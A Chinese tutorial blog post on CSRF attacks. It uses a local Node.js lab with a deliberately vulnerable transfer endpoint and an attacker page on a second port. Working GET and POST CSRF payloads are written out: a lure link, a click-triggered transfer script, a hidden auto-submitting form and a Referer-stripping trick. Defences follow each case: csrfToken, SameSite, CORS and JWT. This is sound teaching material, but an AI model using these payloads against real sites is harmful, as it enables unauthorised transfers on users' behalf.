# CSRF 攻防实战

上一篇文章讲了 [XSS 攻防实战][xss-attack-juejin]，给出了反射型、存储型和 DOM 型的攻击案例，只要做好防御措施，例如把 Cookie 设置成 httpOnly 并且在对用户输入进行过滤的话，XSS 攻击往往就无从下手，但是却防不住 CSRF 攻击，因为从兵法角度，XSS 攻击是攻城，CSRF 是攻心，即便城墙坚不可摧，人心亦可能动摇。

> 上兵伐谋，攻心为上，攻城为下。——《孙子兵法·谋攻篇》

CSRF 的全称是跨站请求伪造（Cross Site Request Forgery），它的攻击原理是：

1. 受害者登录目标网站，保存了该网站的登录状态
2. 攻击者诱导受害者进入第三方网站，向被攻击网站发送跨站请求
3. 由于用户已登录, 该跨站请求被成功执行

CSRF 跨站请求一般有两种类型：

- GET 型
- POST 型

## GET 型 CSRF 攻击

GET 型攻击是当用户进入第三方网站之后，攻击者早已设置好目标网站的链接，并诱导点击，或者利用 JS 事件触发点击，然后在浏览器直接在地址栏打开该链接，发起跨站请求。

### 攻击案例

假设目标网站 `http://localhost:3000` 有三个接口，分别是：

- `login`：登录接口，用户访问后会自动设置 Cookie
- `balance`：查询余额接口
- `transfer`：转账接口，通过 `to` 和 `money` 参数控制向谁转钱、转多少钱

如果用户在目标网站上进行了登录操作，获取了 Cookie 凭证，那么下次访问目标网站其他接口的时候，会自动携带 Cookie，CSRF 攻击正是利用了这个特性。

假设用户被诱导进入第三方网站 `http://127.0.0.1:4000`，里面有个恶意链接：

```js
<a href="http://localhost:3000/transfer?to=hacker&money=100">点击下载</a>
```

如果点击，立马会向目标网站发起转账请求，用户的钱就会自动进入黑客账户。下面给出 `Node.js` 后端服务完整源码：

```js
const http = require('http')
const qs = require('querystring')
const URL = require('url')

// 模拟账户
const account = {
  keliq: 1000, // 受害者账户
  hacker: 0, // 攻击者账户
}

// 路由分发器
const routes = {
  'localhost:3000': (req, res) => {
    const from = req.cookies.session
    if (!from && req.path !== '/login') return res.end('请先登录')
    switch (req.path) {
      case '/login': // 登录接口
        res.setHeader('Set-Cookie', ['session=keliq; httpOnly=true;']) // 设置 httpOnly Cookie 并不能阻止 CSRF 攻击
        res.end('<h2>欢迎您，keliq！</h2>')
        break
      case '/balance': // 查询账户余额接口
        res.end(`${from}的账户余额为：${account[from]}`) 
        break
      case '/transfer': // 转账接口
        const { money, to } = req.query
        account[from] -= money
        account[to] += money
        const str = `${from}向${to}转账成功，金额${money}`
        console.log(str)
        res.end(str)
        break
      default:
        res.end('404')
    }
  },
  '127.0.0.1:4000': (req, res) => {
    res.end(`
<div id="el">
  <p>5G高清美女照片，赶快<a href="javascript:transfer()">点击下载</a>吧！</p>
  <img id="img" width="300" src="http://img.zlib.cn/beauty/1.jpg" />
</div>
<script>
  function transfer() {
    open('http://localhost:3000/transfer?to=hacker&money=100', '', 'width=300,height=100,left=5000,top=5000')
    const h2 = document.createElement('h2')
    h2.innerHTML = '不该点的链接不要点，贪婪是原罪！'
    el.appendChild(h2)
  }
</script>`)
  },
}

function onRequest(req, res) {
  const { url, headers } = req // 获取 url 和 headers
  const cookies = qs.parse(headers.cookie, '; ') // 从 headers 中解析出 cookies 对象
  const { query, pathname: path } = URL.parse(url, true) // 从 url 中解析出 query 和 path 对象
  Object.assign(req, { query, path, cookies }) // 扩展 req
  const route = routes[headers.host] // 根据 host 分发路由（策略模式）
  res.setHeader('content-type', 'text/html;charset=utf-8')
  if (route) return route(req, res)
  res.statusCode = 404 && res.end('Not Found')
}

http.createServer(onRequest).listen(3000) // 被攻击的网站
http.createServer(onRequest).listen(4000) // 攻击者的网站
```

可以看到，代码里面的 Cookie 已经被设置成 httpOnly 的了，也就是说即使被 XSS 攻击也获取不到 Cookie，但是 CSRF 攻击的目的并非获取 Cookie，而是利用浏览器会自动携带 Cookie 的机制，从而伪造用户身份，向目标网站发起请求。

另外，需要注意的是，只要用户进入了第三方网站，CSRF 攻击其实就已经发生了，你可能会问：如果用户不点击上面那个诱导链接的话，不就没有发跨站请求吗？想法太天真了，都已经进入黑客的网站了，岂有让你走的道理，一行 JS 代码搞定：

```js
document.body.addEventListener('click', transfer)
```

页面随便哪里点一下，就转账一次，看你往哪跑？

### 防御方案

1. GET 接口只用于查询，不要用于任何写入操作

    这是 GET 型  CSRF 攻击的要害，千万不要在 GET 请求中做修改数据库、更新状态等类似操作，只要 GET 请求仅用于查询，即可有效防御此类攻击。

2. 设置 Referer 白名单
    
    一般来讲，跨站发送的请求在 header 中会携带 Referer 头部，服务端可以设置一个白名单，拒绝非白名单内的跨站请求即可。但是要注意，这种方式并不能防御所有 GET 型 CSRF 攻击，因为前端是可以绕过 Referer 头部的，例如：
    
    ```html
    <a href="http://localhost:3000/transfer?to=hacker&money=100" rel="noreferrer">点击下载</a>
    ```

3. 添加 csrfToken
    
    CSRF 攻击之所以能够成功是因为验证信息存在 Cookie 中，并且浏览器自动携带 Cookie，如果在请求参数中加入随机 token，并在服务器端验证该 token，则能够防御 CSRF 攻击。例如：
    
    ```sh
    http://localhost:3000/transfer?to=hacker&money=100&csrfToken=xxx
    ```
    
    用户登录后，服务端生成 token 并放在 session 中，后面该用户的每个请求都从 session 拿出这个 token，与请求中的 csrfToken 进行比对，若不一致则拒绝请求。
    

## POST 型 CSRF 攻击

POST 型攻击比 GET 型更为常见，因为大部分操作型接口都是 POST 请求，与 GET 不同的是，攻击者会在第三方网站隐藏一个表单，当用户访问的时候，自动提交该表单。

### 攻击案例

同样假设目标网站 `http://localhost:3000` 有下面三个接口：

- `login`：登录接口，用户访问后会自动设置 Cookie
- `balance`：查询余额接口
- `transfer`：转账接口，通过 `to` 和 `money` 参数控制向谁转钱、转多少钱

不同的是，转账接口不再是 GET 请求，而是 POST 请求，第三方网站里面有个隐藏的表单：

```html
<form id="form" method="POST" enctype="application/x-www-form-urlencoded" action="http://localhost:3000/transfer" style="display: none">
  <input type="text" name="to" value="hacker" />
  <input type="number" name="money" value="100" />
</form>
<script>form.submit()</script>
```

当用户被诱导进入 `http://127.0.0.1:4000` 之后，该表单会自动提交，向目标网站发起 POST 请求，如果浏览器自动携带 Cookie，则跨站请求会被成功执行。

说到这里，不得不提一下 Cookie 的 SameSite 属性，这里推荐阅读阮一峰的[文章][same-site-ryf]，它有三种取值：

- `None`：不禁止第三方 Cookie
- `Lax`：部分禁止第三方 Cookie，只会在使用危险 HTTP 方法发送跨站 Cookie 的时候进行阻止
- `Strict`：完全禁止第三方 Cookie，浏览器不允许将 Cookie 从 A 站发送到 B 站

各大浏览器之前的默认值都是 None，因此上面的 POST 请求会被成功执行，后来 Chrome 把默认值改成 Lax 了，于是上面的 POST 请求就不会携带 Cookie，从而有效阻止 CSRF 攻击。下面列举了当 SameSite 取值为 `Lax` 时是否发送 Cookie 的场景：

| 请求类型  | 示例                                 | 正常情况    | Lax         |
| --------- | ------------------------------------ | ----------- | ----------- |
| 链接      | `<a href="..."></a>`                 | 发送 Cookie | 发送 Cookie |
| 预加载    | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  | `<form method="GET" action="...">`   | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送      |
| iframe    | `<iframe src="..."></iframe>`        | 发送 Cookie | 不发送      |
| AJAX      | `$.get("...")`                       | 发送 Cookie | 不发送      |
| Image     | `<img src="...">`                    | 发送 Cookie | 不发送      |

POST 型 CSRF 攻击 `Node.js` 完整源码如下：

```js
const http = require('http')
const qs = require('querystring')
const URL = require('url')

// 模拟账户
const account = {
  keliq: 1000,
  hacker: 0,
}

// 路由分发器
const routes = {
  'localhost:3000': (req, res) => {
    const from = req.cookies.session
    if (!from && req.path !== '/login') return res.end('请先登录')
    switch (req.path) {
      case '/login': // 登录接口
        res.setHeader('Set-Cookie', ['session=keliq; httpOnly=true;']) // 设置 httpOnly Cookie 不能阻止 CSRF 攻击
        res.end('<h2>欢迎您，keliq！</h2>')
        break
      case '/balance': // 余额查询接口
        res.end(`${from}的账户余额为：${account[from]}`)
        break
      case '/transfer': // POST 类型的转账接口
        const arr = []
        req
          .on('data', (data) => arr.push(data))
          .on('end', () => {
            const { to, money } = qs.parse(Buffer.concat(arr).toString()) // 从 body 中解析 to 和 money 参数
            account[from] -= money
            account[to] += money
            const str = `${from}向${to}转账成功，金额${money}`
            console.log(str)
            res.end(str)
          })
        break
      default:
        res.end('404')
    }
  },
  '127.0.0.1:4000': (req, res) => {
    // 请使用 Firefox 或 Safari 测试（新版 Chrome 浏览器 cookie samesite 默认值为 Lax，所以 POST 攻击方式不可行，除非源站设置 SameSite=None; Secure;
    res.end(`
<h2>看起来像正规网站，你永远不知道背后发生了什么！</h2>
<iframe name="hideIframe" style="display: none"></iframe>
<form
  id="form" target="hideIframe" method="POST"
  enctype="application/x-www-form-urlencoded"
  action="http://localhost:3000/transfer"
  style="display: none"
>
  <input type="text" name="to" value="hacker" />
  <input type="number" name="money" value="100" />
</form>
<script>form.submit()</script>`)
  },
}

function onRequest(req, res) {
  const { url, headers } = req // 获取 url 和 headers
  const cookies = qs.parse(headers.cookie, '; ') // 从 headers 中解析出 cookies 对象
  const { query, pathname } = URL.parse(url, true) // 从 url 中解析出 query 和 path 对象
  Object.assign(req, { query, path: pathname, cookies }) // 扩展 req
  const route = routes[headers.host] // 根据 host 分发路由（策略模式）
  res.setHeader('content-type', 'text/html;charset=utf-8')
  if (route) return route(req, res)
  res.statusCode = 404 && res.end('Not Found')
}

http.createServer(onRequest).listen(3000) // 被攻击的网站
http.createServer(onRequest).listen(4000) // 攻击者的网站
```

### 防御方案

1. csrfToken

    在表单中加入一个 hidden 的 csrfToken 值：
    
    ```html
    <input type="hidden" name="csrfToken" value="xxxx">
    ```
    
    防御原理就是危险请求后端根据 csrfToken 单独验证合法性，由于 csrfToken 是存储在后端的，攻击者无法猜测。
    
2. CORS 白名单 + 自定义 header
    
    现在大部分网页都是 SPA，通过 ajax 发送网络请求，根据浏览器的同源策略，可以在后端设置 CORS 白名单，只让来自指定的源的请求通过，这样就可以阻止大部分跨站攻击，我们还可以添加自定义 header，例如 `X-CSRF-TOKEN`。
    
3. 使用 JWT 做认证

    由于 CSRF 攻击的原理是浏览器自动携带 Cookie，如果放开跨站 Cookie 会有 CSRF 风险，若不放开又没法做单点登录，所以对于 SPA 应用来说，JWT 认证的方式更好一些，将 token 放在 `Authorization` 头部传递给后端做验证。

## 总结

对于单页面应用 SPA 来说，更推荐使用 JWT 方式做认证，可防御 CSRF 攻击，便于单点登录。如果要使用 Cookie 认证的话，请务必遵循下面三点建议：

1. 不要在 GET 请求中实现数据写入操作
2. 在服务端把 Cookie 的 SameSite 属性设为 Lax
3. 所有表单提交增加 csrfToken 隐藏字段

> 源码：

[xss-attack-juejin]: https://juejin.im/post/6867184627393265677
[same-site-ryf]: http://www.ruanyifeng.com/blog/2019/09/cookie-samesite.html
